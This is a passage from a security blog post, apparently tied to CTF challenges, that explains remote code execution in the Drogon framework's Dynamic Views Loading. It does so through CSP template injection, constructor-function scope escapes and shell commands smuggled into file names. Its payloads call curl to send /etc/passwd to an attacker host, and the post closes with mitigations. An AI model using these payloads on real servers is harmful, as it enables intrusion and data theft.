<span class="token keyword">void</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"curl http://attacker.site --data @/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">%</span><span class="token operator">&gt;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++ Server Pages</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>When compiled, all of this is placed in the <code>.init_array</code> section, which allows multiple function pointers to be called during initialisation.</p><h4 id="escaping-function-scope-with-c-and" tabindex="-1"><a class="md-anchor" href="#escaping-function-scope-with-c-and" aria-hidden="true"></a> Escaping Function Scope with <code>&lt;%c++</code> and <code>[[</code></h4><p>Blocking <code>&lt;%inc</code> is not enough. Even with <code>&lt;%c++</code> and <code>[[</code>, it is possible to escape function scope and insert a function in the top-level. This is partly by-design, so that like PHP, we can use C++ if-statements and for-loops to dynamically generate HTML. But we can also abuse this to escape the <code>genText()</code> function.</p><p>We demonstrate this with the following CSP:</p><div class="code-toolbar"><pre data-label="Example.csp" class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span> 
<span class="token punctuation">}</span> 
<span class="token function">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">injected</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"curl http://attacker.site --data @/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
std<span class="token double-colon punctuation">::</span>string <span class="token function">dummy</span><span class="token punctuation">(</span><span class="token keyword">const</span> DrTemplateData<span class="token operator">&amp;</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    drogon<span class="token double-colon punctuation">::</span>OStringStream Example_tmp_stream<span class="token punctuation">;</span>
    std<span class="token double-colon punctuation">::</span>string layoutName<span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token operator">&gt;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span>Example.csp</span></div><div class="toolbar-item"><span class="lang">C++ Server Pages</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>and here's the generated C++:</p><div class="code-toolbar"><pre data-label="Example.cc" data-copy-off="" class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// Boilerplate: includes...</span>
std<span class="token double-colon punctuation">::</span>string <span class="token class-name">Example</span><span class="token double-colon punctuation">::</span><span class="token function">genText</span><span class="token punctuation">(</span><span class="token keyword">const</span> DrTemplateData<span class="token operator">&amp;</span> Example_view_data<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    drogon<span class="token double-colon punctuation">::</span>OStringStream Example_tmp_stream<span class="token punctuation">;</span>
    std<span class="token double-colon punctuation">::</span>string layoutName<span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
 
<span class="token punctuation">}</span> 
<span class="token function">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">injected</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"curl http://attacker.site --data @/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
std<span class="token double-colon punctuation">::</span>string <span class="token function">dummy</span><span class="token punctuation">(</span><span class="token keyword">const</span> DrTemplateData<span class="token operator">&amp;</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    drogon<span class="token double-colon punctuation">::</span>OStringStream Example_tmp_stream<span class="token punctuation">;</span>
    std<span class="token double-colon punctuation">::</span>string layoutName<span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token comment">// Boilerplate: convert stream to string and return....</span></code></pre><div class="toolbar"><div class="toolbar-item"><span>Example.cc</span></div><div class="toolbar-item"><span class="lang">C++</span></div></div></div><p>The same idea goes for variable markup <code>[[...]]</code>, the only difference being whitespace is not allowed.</p><div class="code-toolbar"><pre class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>Hi <span class="token punctuation">[</span><span class="token punctuation">[</span>name<span class="token string">"];}}__attribute__((constructor))void/**/injected(){system("</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token string">");}std::string/**/dummy(const/**/DrTemplateData&amp;data){drogon::OStringStream/**/Example_tmp_stream;std::string/**/layoutName{"</span><span class="token string">"};{auto&amp;val=data["</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++ Server Pages</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>Likewise for <code>&lt;%layout</code> and <code>&lt;%view</code>. (Left as an exercise for the reader.)</p><hr><p>Thought that was the worst we could do? It gets worse.</p><h3 id="4-rce-via-file-name" tabindex="-1"><a class="md-anchor" href="#4-rce-via-file-name" aria-hidden="true"></a> 4. RCE via File Name</h3><p>Remember how Drogon runs <code>drogon_ctl</code> to convert .csp files to .cc files? Guess how this command is run.</p><p>That’s right, <code>system()</code> is <a href="https://github.com/drogonframework/drogon/blob/637046189653ea22e6c4b13d7f47023170fa01b1/lib/src/SharedLibManager.cc#L169" rel="noreferrer" target="_blank">called</a>. And since the CSP file name can be pretty much anything — subject to Linux’s file path conditions — we can inject arbitrary commands and achieve RCE!</p><p><a class="lightbox-single" title="Malicious code can be executed when `drogon_ctl` is run using the filename." href="/img/posts/infosec/drogon-csp/assets/drogon-dynamic-view-loading-exec-on-filename-549w.webp"><img class="mb-2 rw center jw-70 alpha-imgv" src="/img/posts/infosec/drogon-csp/assets/drogon-dynamic-view-loading-exec-on-filename-549w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 549 / 564" alt="Malicious code can be executed when `drogon_ctl` is run using the filename." title="Malicious code can be executed when `drogon_ctl` is run using the filename." srcset="/img/posts/infosec/drogon-csp/assets/drogon-dynamic-view-loading-exec-on-filename-256w.webp 256w, /img/posts/infosec/drogon-csp/assets/drogon-dynamic-view-loading-exec-on-filename-512w.webp 512w, /img/posts/infosec/drogon-csp/assets/drogon-dynamic-view-loading-exec-on-filename-549w.webp 549w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 549px"></a></p><p>Additionally, our command can contain slashes, since Drogon recursively scans subdirectories. A file named <code>foo$(curl attacker.site/abcd)</code> will be treated as a folder (<code>foo$(curl attacker.site/</code>) + a file (<code>abcd)</code>).</p><h2 id="takeaways-and-mitigations" tabindex="-1"><a class="md-anchor" href="#takeaways-and-mitigations" aria-hidden="true"></a> Takeaways and Mitigations</h2><p>Although this was meant for a couple fun 48-hour CTF challenges, it feels appropriate to close with some tips on defence.</p><p>So what did we learn?</p><ol><li>Drogon, at the moment, does not sandbox or properly sanitise CSP content.<sup class="footnote-ref"><a href="#fn4" id="fnref4">4</a></sup> This is by design, since CSPs inherently contain trusted content.</li><li>There are three main ways to achieve RCE on a DVL-enabled Drogon server. And this comes with the prerequisite of file-write privileges.<ol><li>RCE via Rendered CSP</li><li>RCE via Init Section</li><li>RCE via File Name</li></ol></li><li>Denylists need to consider a wide range of bypass methods.</li></ol><p>And mitigations?</p><ol><li>Don't enable Dynamic Views Loading, unless you're in a local dev environment. Switch off DVL after using.</li><li>Don't allow untrusted input to be compiled and loaded as views; statically or dynamically.</li><li>Protecc your dynamic views directory. Don't allow untrusted files to be written there.<ul><li>It doesn't matter if the view will be rendered in application code, because —&nbsp;<a href="#4-rce-via-file-name">as we discovered earlier</a> —&nbsp;once <code>drogon_ctl</code> is run, an RCE endpoint is already exposed.</li></ul></li><li>If, on the off chance, your environment accepts untrusted CSP files, you should consider using some filtering/denylist mechanism.<ul><li>If filtering is performed, it should happen before files are written to the dynamic views directory. Once files are written, it's too late: Drogon kicks in and devours the CSP. <a class="lightbox-single" title="Defensive filtering, if any, should occur before CSP files are written." href="/img/posts/infosec/drogon-csp/assets/drogon-dynamic-view-loading-defence-549w.webp"><img class="mb-2 rw center jw-70 alpha-imgv" src="/img/posts/infosec/drogon-csp/assets/drogon-dynamic-view-loading-defence-549w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 549 / 564" alt="Defensive filtering, if any, should occur before CSP files are written." title="Defensive filtering, if any, should occur before CSP files are written." srcset="/img/posts/infosec/drogon-csp/assets/drogon-dynamic-view-loading-defence-256w.webp 256w, /img/posts/infosec/drogon-csp/assets/drogon-dynamic-view-loading-defence-512w.webp 512w, /img/posts/infosec/drogon-csp/assets/drogon-dynamic-view-loading-defence-549w.webp 549w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 549px"></a></li></ul><p class="caption"><sup>Defensive filtering, if any, should occur before CSP files are written.</sup></p></li></ol><p>Do I expect the RCE issues to be fixed? Considering the purpose of DVLs... probably not. Judging by the maintainer's stance, DVLs are purely meant for development:</p><blockquote><p><em>Note: This feature is best used to adjust the HTML page during the development phase. In the production environment, it is recommended to compile the csp file directly into the target file. This is mainly for security and stability.</em> (<a href="https://github.com/drogonframework/drogon/wiki/ENG-06-View#Dynamic-compilation-and-loading-of-views:~:text=This%20feature%20is%20best%20used%20to%20adjust%20the%20HTML%20page%20during%20the%20development%20phase." rel="noreferrer" target="_blank">Source</a>)</p></blockquote><h2 id="conclusion" tabindex="-1"><a class="md-anchor" href="#conclusion" aria-hidden="true"></a> Conclusion</h2><p>Although Dynamic Views Loading (DVL) seems appealing for implementing features such as user-generated content or dynamically adding plugins, DVL is a dangerous liability if left in the open. In this post, we've demonstrated multiple ways to exploit DVL, given file-write privileges. DVL is ill-suited for production-use and should only be used for its intended purpose — local testing in development environments.</p><p><a class="lightbox-single" title="Dragon's Back in Hong Kong Island. Photo credit: Hong Kong Tourism Board." href="/img/poi-4-960x720-a-960w.webp"><img class="mb-2 rw center jw-80" src="/img/poi-4-960x720-a-960w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 960 / 720" alt="Dragon's Back in Hong Kong Island. Photo credit: Hong Kong Tourism Board." title="Dragon's Back in Hong Kong Island. Photo credit: Hong Kong Tourism Board." srcset="/img/poi-4-960x720-a-256w.webp 256w, /img/poi-4-960x720-a-512w.webp 512w, /img/poi-4-960x720-a-960w.webp 960w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 960px"></a></p><p class="caption"><sup>Nice View: the <em>Dragon's Back</em> Hiking Trail in Hong Kong Island.</sup></p><hr class="footnotes-sep"><b>Footnotes</b><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p>This situation may be less hypothetical than we think. According to Shodan, there are over 1000 servers around the world running Drogon. How many do you think were poorly configured, with devs thinking… “I’ll just enable Dynamic Views Loading for convenience. Nobody can find my IP anyway.” I’m willing to bet there’s at least 1. <a href="#fnref1" class="footnote-backref">↩︎</a></p></li><li id="fn2" class="footnote-item"><p><code>dlopen</code> seems to only be available <a href="https://github.com/drogonframework/drogon/blob/637046189653ea22e6c4b13d7f47023170fa01b1/CMakeLists.txt#L320" rel="noreferrer" target="_blank">on Unix-like machines</a>. <a href="#fnref2" class="footnote-backref">↩︎</a></p></li><li id="fn3" class="footnote-item"><p>Whitelisting a program's <abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Abstract Syntax Tree">AST</abbr> could prove effective, but this requires us to first generate an AST —&nbsp;a non-trivial problem. <a href="#fnref3" class="footnote-backref">↩︎</a></p></li><li id="fn4" class="footnote-item"><p>At the time of writing, I'm using Drogon version 1.9.1. <a href="#fnref4" class="footnote-backref">↩︎</a></p></li></ol></section></div><a id="end-of-article"></a><br><script defer src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><div class="post-share dim-gentle mb-3 d-flex flex-row align-items-center"><div class="d-flex flex-row flex-wrap align-items-center gap-3"><span>Share&nbsp;on</span> <a class="no-decoration" data-sharer="reddit" data-title="Dynamic Views Loading – Abusing Server Side Rendering in Drogon" data-url="/posts/abusing-server-side-rendering-in-drogon/"><span class="fs-4"><i class="fab fa-reddit"></i> </span></a><a class="no-decoration" data-sharer="telegram" data-title="Dynamic Views Loading – Abusing Server Side Rendering in Drogon" data-url="/posts/abusing-server-side-rendering-in-drogon/"><span class="fs-4"><i class="fab fa-telegram"></i> </span></a><a class="no-decoration" data-sharer="whatsapp" data-title="Dynamic Views Loading – Abusing Server Side Rendering in Drogon" data-url="/posts/abusing-server-side-rendering-in-drogon/"><span class="fs-4"><i class="fab fa-whatsapp"></i> </span></a><a class="no-decoration" data-sharer="linkedin" data-title="Dynamic Views Loading – Abusing Server Side Rendering in Drogon" data-url="/posts/abusing-server-side-rendering-in-drogon/"><span class="fs-4"><i class="fab fa-linkedin"></i> </span></a><a class="no-decoration" data-sharer="vk" data-title="Dynamic Views Loading – Abusing Server Side Rendering in Drogon" data-url="/posts/abusing-server-side-rendering-in-drogon/"><span class="fs-4"><i class="fab fa-vk"></i> </span></a><a class="no-decoration" data-sharer="twitter" data-title="Dynamic Views Loading – Abusing Server Side Rendering in Drogon" data-url="/posts/abusing-server-side-rendering-in-drogon/"><span class="fs-4"><i class="fab fa-twitter"></i> </span></a><a id="copy-link-button" class="no-decoration" data-bs-toggle="tooltip" data-bs-trigger="click" title="Link copied!"><span class="fs-4"><i class="fas fa-link"></i></span></a></div></div><hr><div id="post-author-container" class="d-flex justify-content-between align-items-center gap-3" itemprop="author" itemscope itemtype="https://schema.org/Person"><img src="/img/profile-icon.jpg" class="profile-img" alt="" loading="lazy" decoding="async" itemprop="image"><div class="author-info d-flex flex-column gap-1"><p class="profile-name" itemprop="name">TrebledJ</p><p class="profile-bio" itemprop="description">Passionate problem-solver, pentester, and autodidact. I thrive on learning new things and enjoy passing it on. When not immersed in bughunting or programming, I can be found taking walks, composing a short tune, and occasionally indulging in CTF challenges.</p></div></div><hr class="section-sep"><div id="related" class="jw-100"><h3><i class="fas fa-circle-nodes me-2"></i>Related Posts</h3><div class="row gx-3 mt-4"><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/attack-of-the-zip/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/attack-of-the-zip/"><img class="post-img-blurred-bg" src="/img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-500w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 500 / 337" alt="Thumbnail for From Compression to Compromise: Unmasking Zip File Threats" srcset="/img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-256w.webp 256w, /img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-500w.webp 500w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 500px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-500w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 500 / 337" alt="Thumbnail for From Compression to Compromise: Unmasking Zip File Threats" srcset="/img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-256w.webp 256w, /img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-500w.webp 500w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 500px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">From Compression to Compromise: Unmasking Zip File Threats</h2><div class="post-summary"><p>Deep dive into zip file attacks and mitigations (with examples!).</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/infosec/" itemprop="keywords">infosec</a> </span><span><a class="jtag" href="/tags/notes/" itemprop="keywords">notes</a> </span><span><a class="jtag" href="/tags/web/" itemprop="keywords">web</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/reversing-a-siemens-plc-for-funs-and-vulns/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/reversing-a-siemens-plc-for-funs-and-vulns/"><img class="post-img-blurred-bg" src="/img/posts/infosec/siemens-cves/assets/thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 398" alt="Thumbnail for Reverse Engineering a Siemens Programmable Logic Controller for Funs and Vulns (CVE-2024-54089, CVE-2024-54090 & CVE-2025-40757)" srcset="/img/posts/infosec/siemens-cves/assets/thumbnail-256w.webp 256w, /img/posts/infosec/siemens-cves/assets/thumbnail-512w.webp 512w, /img/posts/infosec/siemens-cves/assets/thumbnail-576w.webp 576w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/infosec/siemens-cves/assets/thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 398" alt="Thumbnail for Reverse Engineering a Siemens Programmable Logic Controller for Funs and Vulns (CVE-2024-54089, CVE-2024-54090 & CVE-2025-40757)" srcset="/img/posts/infosec/siemens-cves/assets/thumbnail-256w.webp 256w, /img/posts/infosec/siemens-cves/assets/thumbnail-512w.webp 512w, /img/posts/infosec/siemens-cves/assets/thumbnail-576w.webp 576w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">Reverse Engineering a Siemens Programmable Logic Controller for Funs and Vulns (CVE-2024-54089, CVE-2024-54090 &amp; CVE-2025-40757)</h2><div class="post-summary"><p>When security by obscurity breaks...</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/infosec/" itemprop="keywords">infosec</a> </span><span><a class="jtag" href="/tags/research/" itemprop="keywords">research</a> </span><span><a class="jtag" href="/tags/embedded/" itemprop="keywords">embedded</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/automating-boolean-sql-injection-with-python/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/automating-boolean-sql-injection-with-python/"><img class="post-img-blurred-bg" src="/img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 273" alt="Thumbnail for Automating Boolean-Based SQL Injection with Python" srcset="/img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-256w.webp 256w, /img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-512w.webp 512w, /img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-1024w.webp 1024w, /img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-1800w.webp 1800w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 273" alt="Thumbnail for Automating Boolean-Based SQL Injection with Python" srcset="/img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-256w.webp 256w, /img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-512w.webp 512w, /img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-1024w.webp 1024w, /img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-1800w.webp 1800w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">Automating Boolean-Based SQL Injection with Python</h2><div class="post-summary"><p>How to be efficiently lazy at finding hidden gems in predictable places –&nbsp;Database Edition</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/infosec/" itemprop="keywords">infosec</a> </span><span><a class="jtag" href="/tags/sql/" itemprop="keywords">sql</a> </span><span><a class="jtag" href="/tags/python/" itemprop="keywords">python</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/optimising-web-icons-for-fun/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/optimising-web-icons-for-fun/"><img class="post-img-blurred-bg" src="/img/posts/programming/mini-projects/optimising-web-icons/assets/optimising-web-icons-thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 324" alt="Thumbnail for Optimising Web Icons for Fun" srcset="/img/posts/programming/mini-projects/optimising-web-icons/assets/optimising-web-icons-thumbnail-256w.webp 256w, /img/posts/programming/mini-projects/optimising-web-icons/assets/optimising-web-icons-thumbnail-512w.webp 512w, /img/posts/programming/mini-projects/optimising-web-icons/assets/optimising-web-icons-thumbnail-1024w.webp 1024w, /img/posts/programming/mini-projects/optimising-web-icons/assets/optimising-web-icons-thumbnail-1790w.webp 1790w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/programming/mini-projects/optimising-web-icons/assets/optimising-web-icons-thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 324" alt="Thumbnail for Optimising Web Icons for Fun" srcset="/img/posts/programming/mini-projects/optimising-web-icons/assets/optimising-web-icons-thumbnail-256w.webp 256w, /img/posts/programming/mini-projects/optimising-web-icons/assets/optimising-web-icons-thumbnail-512w.webp 512w, /img/posts/programming/mini-projects/optimising-web-icons/assets/optimising-web-icons-thumbnail-1024w.webp 1024w, /img/posts/programming/mini-projects/optimising-web-icons/assets/optimising-web-icons-thumbnail-1790w.webp 1790w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">Optimising Web Icons for Fun</h2><div class="post-summary"><p>Ejecting unused cargo for leaner performance.</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/programming/" itemprop="keywords">programming</a> </span><span><a class="jtag" href="/tags/web/" itemprop="keywords">web</a> </span><span><a class="jtag" href="/tags/performance/" itemprop="keywords">performance</a></span></div></div></div></div></article></div></div><hr><h3><i class="fas fa-tags me-2"></i>Related Tags</h3><div class="mt-3"><h4><abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Related to cpp">software.programming-language</abbr></h4><span class="d-flex flex-wrap"><a class="jtag" href="/tags/cpp/">cpp</a> <a class="jtag" href="/tags/python/">python</a> <a class="jtag" href="/tags/c/">c</a> <a class="jtag" href="/tags/haskell/">haskell</a> <a class="jtag" href="/tags/js/">js</a> <a class="jtag" href="/tags/qt/">qt</a> <a class="jtag" href="/tags/rust/">rust</a> <a class="jtag" href="/tags/qml/">qml</a> <a class="jtag" href="/tags/sql/">sql</a> <a class="jtag" href="/tags/scala/">scala</a></span></div><div class="mt-3"><h4><abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Related to ctf, infosec">software.security</abbr></h4><span class="d-flex flex-wrap"><a class="jtag" href="/tags/ctf/">ctf</a> <a class="jtag" href="/tags/infosec/">infosec</a> <a class="jtag" href="/tags/reverse/">reverse</a> <a class="jtag" href="/tags/pentesting/">pentesting</a> <a class="jtag" href="/tags/pwn/">pwn</a> <a class="jtag" href="/tags/cryptography/">cryptography</a> <a class="jtag" href="/tags/redteam/">redteam</a> <a class="jtag" href="/tags/stego/">stego</a></span></div><div class="mt-3"><h4><abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Related to linux, programming, web">software.general</abbr></h4><span class="d-flex flex-wrap"><a class="jtag" href="/tags/programming/">programming</a> <a class="jtag" href="/tags/software-engineering/">software-engineering</a> <a class="jtag" href="/tags/web/">web</a> <a class="jtag" href="/tags/aoc/">aoc</a> <a class="jtag" href="/tags/apps/">apps</a> <a class="jtag" href="/tags/dsp/">dsp</a> <a class="jtag" href="/tags/programming-languages/">programming-languages</a> <a class="jtag" href="/tags/linux/">linux</a> <a class="jtag" href="/tags/performance/">performance</a> <a class="jtag" href="/tags/functional/">functional</a> <a class="jtag" href="/tags/types/">types</a> <a class="jtag" href="/tags/windows/">windows</a> <a class="jtag" href="/tags/ai/">ai</a> <a class="jtag" href="/tags/metaprogramming/">metaprogramming</a> <a class="jtag" href="/tags/oop/">oop</a></span></div><div class="mt-3"><h4><abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Related to notes, research, writeup">misc</abbr></h4><span class="d-flex flex-wrap"><a class="jtag" href="/tags/writeup/">writeup</a> <a class="jtag" href="/tags/notes/">notes</a> <a class="jtag" href="/tags/tutorial/">tutorial</a> <a class="jtag" href="/tags/reflection/">reflection</a> <a class="jtag" href="/tags/hkust/">hkust</a> <a class="jtag" href="/tags/project/">project</a> <a class="jtag" href="/tags/experience/">experience</a> <a class="jtag" href="/tags/faith/">faith</a> <a class="jtag" href="/tags/meta/">meta</a> <a class="jtag" href="/tags/learning/">learning</a> <a class="jtag" href="/tags/mathematics/">mathematics</a> <a class="jtag" href="/tags/cheatsheet/">cheatsheet</a> <a class="jtag" href="/tags/research/">research</a> <a class="jtag" href="/tags/satire/">satire</a> <a class="jtag" href="/tags/essay/">essay</a> <a class="jtag" href="/tags/reading/">reading</a></span></div></div><hr class="section-sep"><div class="container-md mt-4 p-4"><a id="comments"></a><p><em>Comments are back! Privacy-focused, without ads, bloatware 🤮, and trackers. Be one of the first to contribute to the discussion — I'd love to hear your thoughts.</em></p><script defer src="https://trebledj.me/js/comentario.min.js"></script><comentario-comments id="comentario" auto-init="false" no-fonts="true" css-override="false" theme="dark"></comentario-comments></div><br></div></div></article></div></div></div><footer class="d-flex flex-column gap-2"><div class="d-flex flex-row gap-3 mx-auto" style="width:fit-content;"><a rel="me noreferrer" href="https://github.com/TrebledJ" target="_blank"><i class="social-icon fab fa-github" style="color:rgb(150, 60, 180) !important;"></i> </a><a rel="me noreferrer" href="https://stackoverflow.com/users/10239789/trebledj" target="_blank"><i class="social-icon fab fa-stack-overflow" style="color:rgb(236, 124, 34) !important;"></i> </a><a rel="me noreferrer" href="https://www.codingame.com/profile/8444100ecb9723c1ec542346b0630aaa2821532" target="_blank"><i class="social-icon d-flex flex-column"><img src="/img/logos/codingame.webp" alt="" loading="lazy" decoding="async"></i></a><a rel="me noreferrer" href="https://soundcloud.com/trebledj" target="_blank"><i class="social-icon fab fa-soundcloud" style="color:rgb(237, 110, 30) !important;"></i> </a><a rel="me noreferrer" href="https://musescore.com/user/20636901" target="_blank"><i class="social-icon d-flex flex-column"><img src="/img/logos/musescore.webp" alt="" loading="lazy" decoding="async"></i></a><a rel="me noreferrer" href="https://discordapp.com/users/220427982798454794" target="_blank"><i class="social-icon fab fa-discord" style="color:rgb(84, 100, 235) !important;"></i> </a><a rel="me" href="mailto:trebledjjj@gmail.com"><i class="social-icon fas fa-envelope"></i> </a><a rel="me" href="/feeds"><i class="social-icon fas fa-square-rss"></i></a></div><p>Copyright&nbsp;©&nbsp;2025&nbsp;TrebledJ • <a href="/privacy-policy">Privacy&nbsp;Policy</a> • <a href="https://github.com/TrebledJ/trebledj.github.io?tab=readme-ov-file#credits--appreciation" rel="noreferrer" target="_blank">Credits</a></p></footer><script defer src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js"></script><script>var tocOptions={tags:["h2","h3","h4"]}</script><script defer src="/cb/MPnrKnjI5w.js"></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;52d99b3d385b4c9a98ac8ad109a95a2a&quot;}"></script></body></html>